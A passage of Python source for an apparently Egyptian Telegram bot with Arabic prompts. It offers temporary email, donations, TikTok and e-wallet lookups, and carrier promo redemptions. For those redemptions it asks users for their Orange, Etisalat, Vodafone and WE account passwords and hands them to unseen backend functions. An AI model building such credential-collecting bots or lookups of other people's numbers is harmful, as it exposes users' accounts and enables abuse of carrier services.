            bot.edit_message_text("❌ فشل في إنشاء البريد. حاول مرة أخرى لاحقاً.", call.message.chat.id, call.message.message_id)
    elif action == 'custom':
        msg = bot.edit_message_text(
            "✏️ أرسل اسم المستخدم الذي تريده (بدون @ والنطاق):",
            call.message.chat.id,
            call.message.message_id
        )
        bot.register_next_step_handler(msg, process_temp_email_username)
    elif action == 'messages':
        msg = bot.edit_message_text(
            "📨 أرسل عنوان البريد الإلكتروني لعرض الرسائل:",
            call.message.chat.id,
            call.message.message_id
        )
        bot.register_next_step_handler(msg, process_temp_email_messages)
    elif action == 'delete':
        msg = bot.edit_message_text(
            "🗑️ أرسل عنوان البريد الإلكتروني الذي تريد حذفه:",
            call.message.chat.id,
            call.message.message_id
        )
        bot.register_next_step_handler(msg, process_temp_email_delete)

def process_temp_email_username(message):
    username = message.text.strip()
    domains = get_temp_email_domains()
    if not domains:
        bot.send_message(message.chat.id, "❌ لا توجد نطاقات متاحة حالياً.")
        return
    keyboard = []
    for domain in domains[:5]:
        keyboard.append([InlineKeyboardButton(f"📧 {domain}", callback_data=f'temp_create_{username}@{domain}')])
    keyboard.append([InlineKeyboardButton("🔙 رجوع", callback_data='temp_email')])
    reply_markup = InlineKeyboardMarkup(keyboard)
    bot.send_message(
        message.chat.id,
        f"📧 اختر النطاق للبريد: {username}@",
        reply_markup=reply_markup
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith('temp_create_'))
def process_temp_email_create(call):
    email = call.data.replace('temp_create_', '')
    username, domain = email.split('@')
    bot.edit_message_text(f"⏳ جاري إنشاء البريد: {email}", call.message.chat.id, call.message.message_id)
    created_email = create_custom_temp_email(username, domain)
    if created_email:
        bot.edit_message_text(
            f"✅ تم إنشاء البريد بنجاح!\n\n📧 البريد: `{created_email}`\n\n⚠️ هذا بريد مؤقت ينتهي بعد فترة من الوقت.",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown'
        )
    else:
        bot.edit_message_text("❌ فشل في إنشاء البريد. قد يكون اسم المستخدم محجوزاً.", call.message.chat.id, call.message.message_id)

def process_temp_email_messages(message):
    email = message.text.strip()
    bot.send_message(message.chat.id, f"⏳ جاري البحث عن رسائل لـ: {email}")
    messages = get_temp_email_messages(email)
    if messages and len(messages) > 0:
        response_text = f"📨 الرسائل الواردة لـ: {email}\n\n"
        for i, msg in enumerate(messages[:5], 1):
            response_text += f"📩 الرسالة {i}:\n"
            response_text += f" من: {msg.get('from', 'غير معروف')}\n"
            response_text += f" الموضوع: {msg.get('subject', 'بدون موضوع')}\n"
            response_text += f" التاريخ: {msg.get('date', 'غير معروف')}\n\n"
        bot.send_message(message.chat.id, response_text)
    else:
        bot.send_message(message.chat.id, "❌ لا توجد رسائل لهذا البريد.")

def process_temp_email_delete(message):
    email = message.text.strip()
    bot.send_message(message.chat.id, f"⏳ جاري حذف البريد: {email}")
    if delete_temp_email(email):
        bot.send_message(message.chat.id, "✅ تم حذف البريد بنجاح.")
    else:
        bot.send_message(message.chat.id, "❌ فشل في حذف البريد. قد يكون غير موجود أو منتهي الصلاحية.")

@bot.callback_query_handler(func=lambda call: call.data == 'donate')
def donate_handler(call):
    if not is_bot_active():
        bot.answer_callback_query(call.id, BOT_DEACTIVATION_MESSAGE, show_alert=True)
        return
    msg = bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text="💫 شكراً لرغبتك في التبرع!\n\nأدخل المبلغ الذي تريد التبرع به (بعملة النجوم):"
    )
    bot.register_next_step_handler(msg, process_donation_amount)

def process_donation_amount(message):
    try:
        amount = int(message.text.strip())
        if amount <= 0:
            bot.reply_to(message, "❌ المبلغ يجب أن يكون أكبر من الصفر!")
            return
        bot.send_invoice(
            chat_id=message.chat.id,
            title="تبرع لدعم البوت",
            description=f"تبرع بقيمة {amount} ⭐",
            provider_token=None,
            currency="XTR",
            prices=[LabeledPrice(label="تبرع", amount=amount)],
            start_parameter="donation",
            invoice_payload=f"donation_{amount}_{message.from_user.id}"
        )
    except ValueError:
        bot.reply_to(message, "❌ الرجاء إدخال رقم صحيح للمبلغ!")
    except Exception as e:
        bot.reply_to(message, f"❌ حدث خطأ: {str(e)}")

@bot.pre_checkout_query_handler(func=lambda query: True)
def process_pre_checkout(pre_checkout_query):
    bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)

@bot.message_handler(content_types=['successful_payment'])
def handle_successful_payment(message):
    amount = message.successful_payment.total_amount
    bot.send_message(
        message.chat.id,
        f"🎉 شكراً جزيلاً لتبرعك بمبلغ {amount} ⭐!\n\nدعمك يساعدنا على تطوير البوت وإضافة المزيد من الميزات."
    )
    for admin_id in ADMINS:
        try:
            bot.send_message(
                admin_id,
                f"🎊 تبرع جديد!\n\nالمستخدم: {message.from_user.first_name} (@{message.from_user.username})\nالمبلغ: {amount} ⭐\nالوقت: {time.strftime('%Y-%m-%d %H:%M:%S')}"
            )
        except:
            pass

@bot.callback_query_handler(func=lambda call: call.data == 'tiktok_search')
def tiktok_search_handler(call):
    if not is_bot_active():
        bot.answer_callback_query(call.id, BOT_DEACTIVATION_MESSAGE, show_alert=True)
        return
    if not SERVICE_STATUS['tiktok']:
        bot.answer_callback_query(call.id, "⛔ خدمة TikTok Search معطلة حالياً", show_alert=True)
        return
    msg = bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text="أدخل اسم مستخدم TikTok (بدون @):"
    )
    bot.register_next_step_handler(msg, process_tiktok_username)

def process_tiktok_username(message):
    username = message.text.strip()
    if not validate_tiktok_username(username):
        msg = bot.reply_to(message, "⚠️ اسم المستخدم غير صحيح! يرجى إدخال اسم مستخدم صالح (بدون مسافات أو رموز خاصة)")
        bot.register_next_step_handler(msg, process_tiktok_username)
        return
    result = get_tiktok_info(username, message.chat.id)
    keyboard = [[InlineKeyboardButton("العودة للقائمة الرئيسية ↩️", callback_data='back')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    if isinstance(result, str):
        bot.send_message(message.chat.id, result, reply_markup=reply_markup)

@bot.callback_query_handler(func=lambda call: call.data == 'check_wallet')
def check_wallet_handler(call):
    if not is_bot_active():
        bot.answer_callback_query(call.id, BOT_DEACTIVATION_MESSAGE, show_alert=True)
        return
    msg = bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text="أدخل رقم الهاتف للتحقق من المحفظة الإلكترونية:"
    )
    bot.register_next_step_handler(msg, process_wallet_number)

def process_wallet_number(message):
    if not is_bot_active():
        bot.reply_to(message, BOT_DEACTIVATION_MESSAGE)
        return
    if not (message.text.startswith('01') and len(message.text) == 11 and message.text.isdigit()):
        msg = bot.reply_to(message, "⚠️ رقم غير صحيح! يجب أن يبدأ بـ01 ويتكون من 11 رقماً.")
        bot.register_next_step_handler(msg, process_wallet_number)
        return
    result = check_wallet(message.text, message.chat.id)
    keyboard = [[InlineKeyboardButton("العودة للقائمة الرئيسية ↩️", callback_data='back')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    bot.send_message(message.chat.id, result, reply_markup=reply_markup)

@bot.callback_query_handler(func=lambda call: True)
def button_handler(call):
    if not is_bot_active() and call.data not in ['toggle_bot', 'admin_back']:
        bot.answer_callback_query(call.id, BOT_DEACTIVATION_MESSAGE, show_alert=True)
        return
    if not is_user_subscribed(call.from_user.id):
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="⚠️ يجب الاشتراك في القناة أولاً لاستخدام البوت.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📢 قناة Mido الاشتراك الإجباري 📢", url=f'https://t.me/{CHANNEL_USERNAME}')],
                [InlineKeyboardButton("✅ تأكد من الاشتراك", callback_data='check_subscription')]
            ])
        )
        return
    if call.data == 'orange':
        if not SERVICE_STATUS['orange']:
            bot.answer_callback_query(call.id, "⛔ خدمة Orange معطلة حالياً", show_alert=True)
            return
        keyboard = [
            [InlineKeyboardButton("عرض الـ5G", callback_data='1000mg')],
            [InlineKeyboardButton("عجلة الحظ", callback_data='wheel')],
            [InlineKeyboardButton("Orange Business Gifts", callback_data='orange_business_gifts')],
            [InlineKeyboardButton("2000-MB", callback_data='orange_2000mb')],
            [InlineKeyboardButton("Orange Fawazeer", callback_data='orange_fawazeer')],
            [InlineKeyboardButton("أسئلة وإجابات Fawazeer", callback_data='extract_fawazeer')],
            [InlineKeyboardButton("معرفة الرصيد", callback_data='orange_balance')],
            [InlineKeyboardButton("اشتراك WatchIT", callback_data='orange_watchit')],
            [InlineKeyboardButton("رجوع ↩️", callback_data='back')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="خدمات Orange المتاحة:",
            reply_markup=reply_markup
        )
    elif call.data == 'etisalat':
        if not SERVICE_STATUS['etisalat']:
            bot.answer_callback_query(call.id, "⛔ خدمة Etisalat معطلة حالياً", show_alert=True)
            return
        keyboard = [
            [InlineKeyboardButton("500 ميجا سوشيال", callback_data='etisalat_500mg')],
            [InlineKeyboardButton("500 ميجا ستريمنج", callback_data='etisalat_streaming')],
            [InlineKeyboardButton("هدية 100 وحدة", callback_data='etisalat_100_units')],
            [InlineKeyboardButton("الهدية اليومية", callback_data='etisalat_daily_gift')],
            [InlineKeyboardButton("اشتراك شاهد VIP", callback_data='etisalat_shahid')],
            [InlineKeyboardButton("حذف حساب ماي اتصالات", callback_data='etisalat_delete_account')],
            [InlineKeyboardButton("رجوع ↩️", callback_data='back')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="خدمات Etisalat المتاحة:",
            reply_markup=reply_markup
        )
    elif call.data == 'vodafone':
        if not SERVICE_STATUS['vodafone']:
            bot.answer_callback_query(call.id, "⛔ خدمة Vodafone معطلة حالياً", show_alert=True)
            return
        keyboard = [
            [InlineKeyboardButton("خصم فليكس 260", callback_data='vodafone_flex_discount')],
            [InlineKeyboardButton("كوبونات فودافون", callback_data='vodafone_gifts')],
            [InlineKeyboardButton("خصم على باقة Plus 20,000", callback_data='vodafone_plus_discount')],
            [InlineKeyboardButton("هدايا الصيف - 1000MG", callback_data='vodafone_summer_gift')],
            [InlineKeyboardButton("توزيع الفليكسات", callback_data='vodafone_distribute_flex')],
            [InlineKeyboardButton("رجوع ↩️", callback_data='back')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="خدمات Vodafone المتاحة:",
            reply_markup=reply_markup
        )
    elif call.data == 'we':
        if not SERVICE_STATUS['we']:
            bot.answer_callback_query(call.id, "⛔ خدمة WE معطلة حالياً", show_alert=True)
            return
        keyboard = [
            [InlineKeyboardButton("معلومات الخط", callback_data='we_line_info')],
            [InlineKeyboardButton("معرفة الاستهلاك", callback_data='we_usage')],
            [InlineKeyboardButton("رجوع ↩️", callback_data='back')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="خدمات WE المتاحة:",
            reply_markup=reply_markup
        )
    elif call.data == '1000mg':
        msg = bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="أدخل رقم Orange الخاص بك لتفعيل الـ 1000MG:"
        )
        bot.register_next_step_handler(msg, process_orange_number, '1000mg')
    elif call.data == 'wheel':
        msg = bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="أدخل رقم Orange الخاص بك لعجلة الحظ:"
        )
        bot.register_next_step_handler(msg, process_wheel_number)
    elif call.data == 'orange_business_gifts':
        msg = bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="أدخل رقم Orange الخاص بك للحصول على Orange Business Gifts:"
        )
        bot.register_next_step_handler(msg, process_orange_business_number)
    elif call.data == 'orange_2000mb':
        msg = bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="أدخل رقم Orange الخاص بك لتفعيل 2000MB:"
        )
        bot.register_next_step_handler(msg, process_orange_2000mb_number)
    elif call.data == 'orange_fawazeer':
        msg = bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="أدخل رقم Orange الخاص بك لتفعيل Fawazeer:"
        )
        bot.register_next_step_handler(msg, process_orange_fawazeer_number)
    elif call.data == 'extract_fawazeer':
        msg = bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="أدخل رقم Orange الخاص بك لاستخراج أسئلة Fawazeer:"
        )
        bot.register_next_step_handler(msg, process_extract_fawazeer_number)
    elif call.data == 'orange_balance':
        msg = bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="أدخل رقم Orange للتحقق من الرصيد:"
        )
        bot.register_next_step_handler(msg, process_orange_balance_number)
    elif call.data == 'orange_watchit':
        msg = bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="أدخل رقم Orange لتفعيل WatchIT:"
        )
        bot.register_next_step_handler(msg, process_orange_watchit_number)
    elif call.data == 'etisalat_500mg':
        msg = bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="أدخل رقم Etisalat الخاص بك (يبدأ بـ 011):"
        )
        bot.register_next_step_handler(msg, process_etisalat_number)
    elif call.data == 'etisalat_streaming':
        msg = bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="أدخل رقم Etisalat الخاص بك (يبدأ بـ 011):"
        )
        bot.register_next_step_handler(msg, process_etisalat_streaming_number)
    elif call.data == 'etisalat_100_units':
        msg = bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="أدخل بريد Etisalat الإلكتروني وكلمة المرور (مثال: email@example.com pass):"
        )
        bot.register_next_step_handler(msg, process_etisalat_100_units)
    elif call.data == 'etisalat_daily_gift':
        msg = bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="أدخل بريد Etisalat الإلكتروني وكلمة المرور (مثال: email@example.com pass):"
        )
        bot.register_next_step_handler(msg, process_etisalat_daily_gift)
    elif call.data == 'etisalat_shahid':
        msg = bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="أدخل بريد Etisalat الإلكتروني وكلمة المرور لتفعيل شاهد VIP:"
        )
        bot.register_next_step_handler(msg, process_etisalat_shahid)
    elif call.data == 'etisalat_delete_account':
        msg = bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="أدخل بريد Etisalat الإلكتروني وكلمة المرور لحذف الحساب:"
        )
        bot.register_next_step_handler(msg, process_etisalat_delete_account)
    elif call.data == 'we_line_info':
        msg = bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="أدخل رقم WE الخاص بك وكلمة المرور (مثال: 01234567890 password):"
        )
        bot.register_next_step_handler(msg, process_we_line_info)
    elif call.data == 'we_usage':
        msg = bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="أدخل رقم WE الخاص بك وكلمة المرور (مثال: 01234567890 password):"
        )
        bot.register_next_step_handler(msg, process_we_usage)
    elif call.data == 'vodafone_flex_discount':
        msg = bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="أدخل رقم Vodafone الخاص بك وكلمة المرور:"
        )
        bot.register_next_step_handler(msg, process_vodafone_flex_discount)
    elif call.data == 'vodafone_gifts':
        msg = bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="أدخل رقم Vodafone الخاص بك وكلمة المرور:"
        )
        bot.register_next_step_handler(msg, process_vodafone_gifts)
    elif call.data == 'vodafone_plus_discount':
        msg = bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="أدخل رقم Vodafone الخاص بك وكلمة المرور:"
        )
        bot.register_next_step_handler(msg, process_vodafone_plus_discount)
    elif call.data == 'vodafone_summer_gift':
        msg = bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="أدخل رقم Vodafone الخاص بك وكلمة المرور:"
        )
        bot.register_next_step_handler(msg, process_vodafone_summer_gift)
    elif call.data == 'vodafone_distribute_flex':
        msg = bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="أدخل رقم المالك وكلمة المرور والرقم المستهدف ونسبة التوزيع (مثال: 01234567890 pass 01111111111 50):"
        )
        bot.register_next_step_handler(msg, process_vodafone_distribute_flex)
    elif call.data == 'back':
        start(call.message)

# ========== دوال معالجة الخطوات (process_xxx) ==========
def process_orange_number(message, service):
    number = message.text.strip()
    if not validate_phone(number):
        bot.reply_to(message, "⚠️ رقم هاتف غير صحيح! يرجى إدخال رقم مصري صحيح (11 رقم يبدأ بـ 01)")
        return
    msg = bot.reply_to(message, "أدخل كلمة المرور:")
    bot.register_next_step_handler(msg, lambda m: process_orange_password(m, number, service))

def process_orange_password(message, number, service):
    password = message.text.strip()
    if len(password) < 4:
        bot.reply_to(message, "⚠️ كلمة المرور قصيرة جداً!")
        return
    if service == '1000mg':
        result = redeem_500mg(number, password, message.chat.id)
    elif service == 'wheel':
        result = spin_wheel(number, password, message.chat.id)
    elif service == 'orange_business_gifts':
        result = redeem_orange_business_gifts(number, password, message.chat.id)
    elif service == 'orange_fawazeer':
        result = redeem_orange_fawazeer(number, password, message.chat.id)
    elif service == 'extract_fawazeer':
        result = extract_fawazeer_questions(number, password, message.chat.id)
    elif service == 'orange_watchit':
        result = activate_watchit(number, password, message.chat.
